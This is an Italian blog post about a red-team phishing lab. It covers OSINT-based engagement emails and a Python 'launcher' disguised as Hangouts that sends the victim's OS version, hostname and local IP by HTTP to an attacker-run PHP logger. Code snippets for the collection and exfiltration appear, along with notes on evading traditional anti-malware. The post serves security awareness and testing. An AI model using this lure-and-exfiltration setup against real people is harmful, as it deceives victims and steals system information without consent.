---
layout:     post
title:      "Social Engineering e Phishing (play session)"
date:       2022-02-08 12:22:44 +0100
categories: [cyber-security, hacking, ita]
image:
---
Ho avuto l'occasione di discutere assieme al mio red team la realizzazione di una campagna di phishing per la quale abbiamo potuto ragionare senza particolari vincoli. Approfittando delle nuove giovani menti recentemente unitesi al gruppo ho pensato di giocare con diverse tecniche per costruire una campagna con obiettivi differenti rispetto alle classiche azioni di tracciamento. In questo post condivido le idee e la p-o-c della campagna.

Cosa sia il phishing ovviamente lo sanno anche i sassi, è quindi particolarmente interessante osservare quanto sia ancora una tecnica efficace anche quando interessa organizzazioni strutturate. Osservare e misurare il comportamento delle "vittime" di phishing permette di individuare quali siano alcuni dei pattern di comportamento più frequenti. Noto ad esempio come campagne che utilizzano informazioni reali, in riferimento ad eventi o dati che l'attacker ha individuato, registrino un tasso di successo sensibilmente più alto. Diventa quindi assolutamente sensato predisporre simulazioni, in un contesto di security assessment concordato, basate su informazioni reali pattuite con il target o - meglio ancora - individuate tramite specifiche ricerche (OSInt).

Per la campagna descritta in questo lab abbiamo deciso di sviluppare due fasi: nella prima fase l'attacker cerca di instaurare un dialogo con il target per poi inviare, in una seconda comunicazione, un malware camuffato da software lecito.

<img src="{{ '/assets/images-posts/image.png' | relative_url }}" alt="image" style="float: left; width: 400px; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Le cyberweapons sono quindi due: la stessa comunicazione via email (dotata di un elemento di tracciamento che non è oggetto di questo post) ed il finto malware costruito appositamente per raccogliere informazioni sul sistema vittima. Ovviamente l'attacker deve disporre di un host d'appoggio per farsi inviare le informazioni che intende carpire. Per "giocare" con questa tecnica iniziamo proprio da questo elemento: l'host controllato dall'attacker.

Per strutturare un lab minimo basta avere una macchina linux con un server di pubblicazione, per questo scenario usiamo un semplicissimo LAMP. Diamoci un obiettivo semplice per partire: il finto malware si limiterà a mandarci tre dati via http: la versione del sistema operativo della vittima, l'hostname e l'indirizzo IP locale. Il server deve quindi limitarsi a raccogliere questi dati e registrarli in un file. Il server che raccoglierà i dati deve quindi avere a bordo un semplice script (in questo lab uso PHP) che riceva le informazioni e le scriva in un log file. Qualcosa di simile a questo:

<img src="{{ '/assets/images-posts/image-1.png' | relative_url }}" alt="image 1" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

https://github.com/roccosicilia/sToolz/blob/master/Phishing/attachments/logme.php

Nella repo di GitHub il file completo "logme.php" consente di gestire un paio di condizioni ma la base è invariata. Per eseguire una prova è sufficiente posizionare il file nella Document Root del vostro web server ed accedervi via browser valorizzando opportunamente le variabili in URL.

<img src="{{ '/assets/images-posts/image-2.png' | relative_url }}" alt="image 2" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Test dello script via browser

Preparato il sistema per raccogliere i dati passiamo alla piccola trappola che abbiamo pensato: un semplice eseguibile che chieda le informazioni al sistema vittima e le invii al web server con una semplice http request. Ovviamente non si tratta di un malware in senso stretto per diversi motivi: innanzi tutto è assolutamente innocuo al di la del raccogliere dei dati specifici dal client target, inoltre è assolutamente "stupido" non presentando nessuna tipica caratteristica di camuffamento. Di fatto è un banale script che chiede tre dati e li invia ad un web server.

Per l'occasione lo script viene compilato e gli viene data l'apparenza di file lecito: nel lab, il cui codice è disponibile [qui](https://github.com/roccosicilia/sToolz/blob/master/Phishing/attachments/trackme.py), viene utilizzata l'icona di Hangouts e vengono definite alcune proprietà del file. Gli elementi principali sono ovviamente le chiamate al sistema target:

```
### platform info
os_ver = platform.platform()

### hostname
hostname = socket.gethostname()

### netinfo
local_ip = socket.gethostbyname(str(hostname))
```

Nello script disponibile su GitHub ci sono un paio di alternative commentate per provare diverse modalità di raccolta delle informazioni. I dati vengono poi spediti al web server con una semplice *requests* al già predisposto script logme.php:

```
url = "{}/logme.php?os_ver={}&hostname={}&local_ip={}".format(target_url, os_ver, hostname, local_ip)
req = requests.get(url)
```

Il log registrato potrebbe assomigliare a questo:

<img src="{{ '/assets/images-posts/image-3.png' | relative_url }}" alt="image 3" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Tutti gli elementi per il test sono pronti, manca l'innesco che nel caso specifico è costituito da una prima email per creare la "relazione": in questa campagna abbiamo infatti pensato di inviare una prima comunicazione assolutamente pulita da un indirizzo email creato appositamente senza utilizzare tecniche di spoofing relativamente semplici da intercettare. Ovviamente una comunicazione di questo tipo ha bisogno di altri elementi per attrarre il target, in questo caso abbiamo utilizzato informazioni ricavate dall'analisi OSInt per invitare gli interlocutori ad un meet su un tema di sviluppo aziendale per il quale il [White Hat](https://twitter.com/Ali_Mi_92) ha ipotizzato un forte interesse da parte del target.

Una comunicazione così formattata non attiva - di solito - nessun sistema di controllo: niente spoofing, niente link sospetti, nessun contenuto pericoloso. Puro *engage*. In questo scenario le potenziali vittime sono coloro che rispondono al tentativo di engage: si è potenzialmente creato un dialogo, il canale è quindi aperto.

Di fatto abbiamo utilizzato una tecnica di Social Engineering per aprire un canale diretto con delle potenziali vittime. Saranno queste il target dell'attacco di phishing a cui inviare l'invito al meet con la richiesta di scaricare il "launcher" per accedere alla conferenza. Nell'ambito del Social Engineering esistono diverse tecniche di engage che fanno leva sulle abitudini delle vittime e sulla costruzione di uno scenario realistico. Per questo motivo gli attacchi mirati che partono con una banalissima email ben strutturata, con informazioni contestualizzate e con riferimenti a fatti o dati reali, tendono a funzionare molto bene; una volta costruita la relazione con il target è relativamente facile indurlo a scaricare contenuti potenzialmente pericolosi sulla propria workstation al fine di installare un malware o, come nel caso dell'esempio, prelevare informazioni dal sistema vittima.

Ho notato come le campagne mirate tendono a "scremare" il numero delle potenziali vittime: l'approccio in due fasi porta a ridurre di molto il numero dei potenziali target all'interno dell'organizzazione. Contestualmente si ottiene un target molto più "qualificato".

In definitiva l'attacco si concretizza nel portare la vittima a scaricare il malware per eseguirlo sulla propria workstation:

<img src="{{ '/assets/images-posts/image-4.png' | relative_url }}" alt="image 4" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

So a cosa state pensando: "va bhe, ma l'anti-malware blocca una schifezza del genere". Quasi :-)

Dovremmo aprire un capitolo enorme su come funzionano gli anti-malware tradizionali rispetto ai più recenti EDR / XDR e tutto quello che riterrete opportuno installare sui vostri End Point. Abbiamo fatto ovviamente alcuni test ed in generale possiamo affermare che un eseguibile "ignorante" come quello proposto in questo piccolo lab viene rilevato nella quasi totalità dei casi dagli EDR / XDR quando si tenta l'esecuzione sulla macchina vittima, gli alti-malware tradizionali fanno decisamente più fatica: nelle prove il file non viene mai rilevato come malevolo in fase di scansione e se eseguito in alcuni casi è scattato il blocco della chiamata http in uscita ma il processo locale è stato eseguito.

I log presentati nell'ultimo screen vengono da sistemi con anti-malware tradizionali tranne uno specifico caso (il penultimo) ove era attivo un EDR in configurazione di default. Questa ultima informazione lascia spazio per un altro tema immenso: la configurazione degli EDR/XDR. E' banale dirsi che le conf. di default non dovrebbero mai essere usate in produzione, dobbiamo fare i conti con il "mondo vero" dove sono largamente utilizzate esponendo i sistemi a minacce anche banalissime.

## Conclusioni

Le note che condivido sono semplici e sostanziali:

- non sottovalutare il fattore umano... considerazione banale ma visti gli esiti delle campagne di phishing è evidente che ancora non ci siamo
- la tecnologia è uno strumento potente se lo usate correttamente, in caso contrario si ottiene solo un falso senso di sicurezza
